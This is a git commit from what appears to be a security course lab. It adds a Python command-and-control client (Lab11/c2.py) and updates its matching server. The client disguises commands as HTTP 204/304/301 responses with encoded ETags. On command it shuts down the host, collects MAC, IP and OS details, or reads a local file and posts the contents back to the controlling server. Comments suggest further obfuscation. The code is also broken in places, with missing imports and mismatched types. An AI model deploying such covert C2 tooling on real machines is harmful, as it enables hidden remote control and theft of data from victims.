17f82f926703ac1ef996e0880eac6628aaf431de
KieraConway <66643785+KieraConway@users.noreply.github.com>
2024-06-17 20:17:21 -0700

    Final Course Update

---
+++ Lab11/c2.py
@@ -0,0 +1,173 @@
+import requests
+import threading
+import os
+from datetime import datetime, timedelta
+
+SERVER_IP = '192.168.1.104'
+SERVER_PORT = 80
+
+t_host_shutdown = None
+t_client_shutdown = None
+
+def send_request(method, data=None):
+    url = f'http://{SERVER_IP}:{SERVER_PORT}/'
+    headers = {
+        'Accept': 'text/html',
+        'User-Agent': 'c2client',  # Update for better obfuscation if needed
+        'Accept-Language': 'en-us',
+        'Connection': 'keep-alive'
+    }
+
+    if method == 'GET':
+        response = requests.get(url, headers=headers)
+        return response.text
+        
+    elif method == 'POST' and data is not None:
+    
+        headers['Content-Type'] = 'text/plain'  # Add 'Content-Type' header
+        data_encoded = data.encode('utf-8')  # Encode the body as bytes
+        response = requests.post(url, headers=headers, data=data_encoded)
+        return None
+
+
+
+def process_command(command):
+
+    # execute shutdowns (1: host, 2: client)
+    if command.startswith('HTTP/1.1 204 No Content'):
+        # Extracting information from packet
+        headers = command.split('\r\n')
+        etag = headers[3].split(': ')[1].strip('"')     #who to shutdown
+        delay = int(headers[4].split('=')[1])
+        delay = headers[4].split('=')[1]
+        # Constructing POST body response
+        target = None
+        if etag.startswith('h'):
+            target = 'host'
+            post_body = f"1:{delay}"
+            send_request('POST', post_body)
+            
+        elif etag.startswith('c'):
+            target = 'client'
+            post_body = f"2:{delay}"
+            send_request('POST', post_body)
+            
+        if delay > 0 and target == 'client':
+            t_host_shutdown = threading.Thread(target=shutdown_target, args=(target, delay))
+            t_host_shutdown.start()
+            
+        else:
+            shutdown_target(target, delay)
+            
+    # extract host information (3: MAC, 4: IP, 5: OS info)
+    elif command.startswith('HTTP/1.1 304 Not Modified'):
+        # Extracting information from packet
+        headers = command.split('\r\n')
+        etag = headers[4].split(': ')[1].strip('"')    #what to extract
+        data = None
+    
+        # Determine data based on ETag
+        if etag.startswith('m'):
+            data = 'MAC'
+            extracted_data = get_addresses('mac')
+            post_body = f"3:{extracted_data}"
+            send_request('POST', post_body)
+            
+        elif etag.startswith('i'):
+            data = 'IP'
+            extracted_data = get_addresses('mac')
+            post_body = f"4:{extracted_data}"
+            send_request('POST', post_body)
+            
+        elif etag.startswith('o'):
+            data = 'OS info'
+            extracted_data = get_os_info()
+            post_body = f"5:{extracted_data}"
+            send_request('POST', post_body)
+
+    # upload (6: file)
+    elif command.startswith('HTTP/1.1 301 Moved Permanently'):
+        headers = command.split('\r\n')
+        obfuscated_location = headers[3].split(': ')[1]    #file location
+        location = obfuscated_location.split('.com')[1]
+
+        file_contents = extract_file(location)
+        send_request('POST', file_contents)
+       
+        
+
+def shutdown_target (target, delay):
+    if target == 'client':
+        time.sleep(delay)
+        exit()
+        
+    if target == 'host':
+        current_time = datetime.now()
+        new_time = current_time + timedelta(seconds=delay)
+        new_time_str = new_time.strftime('%H:%M:%S')
+        
+        if delay > 0:
+            subprocess.run(f'shutdown -h {new_time_str}', shell=True)
+        else:
+            subprocess.run(f'shutdown -h', shell=True)
+            
+            
+def get_addresses(target):
+    addresses = []
+    
+    try:
+        # List network interfaces
+        interfaces = os.listdir('/sys/class/net')
+        
+        # Select default interface (excluding 'lo' loopback interface)
+        default_interface = next(iface for iface in interfaces if iface != 'lo')
+        
+        addrs = ni.ifaddresses(default_interface)
+        
+        if target == 'mac' and ni.AF_LINK in addrs:
+            addresses = [addr['addr'] for addr in addrs[ni.AF_LINK]]
+        elif target == 'ip' and ni.AF_INET in addrs:
+            addresses = [addr['addr'] for addr in addrs[ni.AF_INET]]
+            
+    except ValueError as err:
+        #print(f"Error: {err}")
+        addresses = 'None'
+        
+    return addresses
+    
+def extract_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            return file.read()
+            
+    except FileNotFoundError as err:
+        #print(f"Error: {err}")
+        return "Error: File Not Found"
+    
+def get_os_info():
+    os_info = {
+        'system': platform.system(),  # OS Name 
+        'release': platform.release(),  # OS Release
+        'version': platform.version(),  # OS Version
+        'machine': platform.machine(),  # Machine type
+        'processor': platform.processor()  # Processor type
+    }
+    # Format as string
+    os_info_str = ', '.join(f"{key}: {value}" for key, value in os_info.items())
+    
+    return os_info_str
+    
+    
+if __name__ == "__main__":
+    start_time = time.time()
+    duration = 300  #300s = 5min
+    
+    while time.time() - start_time < duration:
+        # send get request to let server know connection was made
+        response_text = send_request('GET')
+        # process and execute received command
+        process_command(response_text)
+        
+        time.sleep(1)
+        
+        
--- Lab11/server.py
+++ Lab11/server.py
@@ -1,10 +1,9 @@
 import socket
-import base64
 from datetime import datetime
 import string
 import random
 
-SERVER_NAME = "c2server/1.0"    #for demo only, update for better obfuscation
+SERVER_NAME = "c2server/1.0"  # for demo only, update for better obfuscation
 SERVER_IP = '192.168.1.104'
 SERVER_PORT = 80
 
@@ -28,7 +27,7 @@ def get_user_input():
             return choice
         else:
             print("[!] Error: Invalid choice")
-            
+
 
 def print_client_response(cmd_type, txt_body):
     if cmd_type == 1:
@@ -42,7 +41,8 @@ def print_client_response(cmd_type, txt_body):
     elif cmd_type == 5:
         print(f'OS Information is {txt_body}')
     elif cmd_type == 6:
-        print(f'Uploading file at {txt_body}')
+        print(f'File Contents: {txt_body}')
+
 
 def parse_request(request_data):
     request_lines = request_data.split('\r\n')
@@ -51,7 +51,7 @@ def parse_request(request_data):
     method = request_lines[0].split()[0]
     if method.startswith('GET'):
         return "GET", None
-        
+
     elif method.startswith('POST'):
         '''
         content_length = 0
@@ -66,27 +66,28 @@ def parse_request(request_data):
         body_start_index = request_data.find('\r\n\r\n') + 4
         request_body = request_data[body_start_index:]
         return "POST", request_body
-    
+
     else:
         print(f"[!] Error Processing Client Request\n{request_data}")
         return None, None
 
+
 def build_packet(command):
-
     current_datetime = datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
-
+    packet = ""
+    
     # execute shutdowns (1: host, 2: client)
     if command == '1' or command == '2':
         print("[*] Enter shutdown delay (s) or 0 for immediate:")
         delay = input("   > ")
         etag_prefix = 'h' if command == '1' else 'c'  # eTag prefix based on command
         etag = generate_etag(etag_prefix)
-        
+
         packet = (
-            f"HTTP/1.1 204 No Content\r\n"          
+            f"HTTP/1.1 204 No Content\r\n"
             f"Date: {current_datetime}\r\n"
             f"Server: {SERVER_NAME}\r\n"
-            f"ETag: \"{etag}\"\r\n"          # who to shutdown
+            f"ETag: \"{etag}\"\r\n"  # who to shutdown
             f"Cache-Control: max-age={delay}\r\n"  # how long until shutdown
             f"\r\n"  # indicate end of headers
         )
@@ -102,20 +103,20 @@ def build_packet(command):
             f"Date: {current_datetime}\r\n"
             f"Server: {SERVER_NAME}\r\n"
             f"Cache-Control: no-cache\r\n"
-            f"ETag: \"{etag}\"\r\n"          # what to extract
-            f"Content-Location: /index.html\r\n"    #idea: tell where to send information
+            f"ETag: \"{etag}\"\r\n"  # what to extract
+            f"Content-Location: /index.html\r\n"  # idea: tell where to send information
             f"\r\n"
         )
-        
+
     # upload (6: file)
-    elif command == '6':        # Upload file
-        #print("[*] Enter location of file to upload:")
-        #file_path = input("   > ")
-        
-        dummy_website = 'https://tla.com'
+    elif command == '6':  # Upload file
+        # print("[*] Enter location of file to upload:")
+        # file_path = input("   > ")
+
+        dummy_website = 'http://tla.com'
         file_path = "/etc/csc841_tmp.txt"
         obfuscated_location = dummy_website + file_path
-        
+
         packet = (
             f"HTTP/1.1 301 Moved Permanently\r\n"
             f"Date: {current_datetime}\r\n"
@@ -134,6 +135,7 @@ def generate_etag(first_letter):
     ran_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return first_letter + ran_chars
 
+
 if __name__ == "__main__":
     # Create socket
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -146,40 +148,40 @@ if __name__ == "__main__":
         try:
             client_sock, client_addr = server_sock.accept()
             print(f"[*] Accepted connection from {client_addr[0]}:{client_addr[1]}")
-            
+
             # Receive data from the client
             request_data = client_sock.recv(1024).decode('utf-8')
-            print("[*] Received data from client:")
-            #print(request_data)
-            
+            #print("[*] Received data from client:")
+            # print(request_data)
+
             # Parse and determine client request type
             request_type, request_body = parse_request(request_data)
             print("[*] Request Type:", request_type)
-            
+
             if request_type is not None:
                 if request_type == "POST":
                     try:
                         print("[*] Client Responded to Command")
                         cmd_type, txt_body = request_body.split(':', 1)
                         print_client_response(int(cmd_type.strip()), txt_body.strip())
-                        
+
                     except Exception as err:
                         print("[!] Error: {err}")
-                
+
                 if request_type == "GET":
                     print("[*] Client Queued for Action")
-                
+
                     usr_cmd = get_user_input()
                     if usr_cmd == 'q':
-                        #idea: send self destruct to client
+                        # idea: send self destruct to client
                         break
                     else:
-                        packet = build_packet(usr_cmd)         # Create Packet
-                        client_sock.sendall(packet.encode('utf-8'))   # Send packet
-        
+                        packet = build_packet(usr_cmd)  # Create Packet
+                        client_sock.sendall(packet.encode('utf-8'))  # Send packet
+
         except Exception as err:
             print("[!] Error: {err}")
             break
-            
+
     # Close the client socket
     server_sock.close()
